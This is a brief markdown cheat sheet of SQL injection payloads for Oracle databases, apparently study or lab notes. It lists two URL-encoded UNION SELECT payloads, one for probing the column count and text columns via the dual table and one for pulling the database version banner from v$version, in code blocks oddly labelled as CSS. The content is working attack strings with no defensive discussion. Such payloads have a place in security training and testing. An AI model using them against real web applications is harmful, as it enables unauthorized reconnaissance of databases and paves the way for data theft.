# SQL Injection Payloads

**Oracle database type and version information**
  - Determine the number of columns being returned by the query and which columns contain text data.
```CSS
'+UNION+SELECT+'abc','def'+FROM+dual--
```
  - Display the database version information
```CSS
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
---
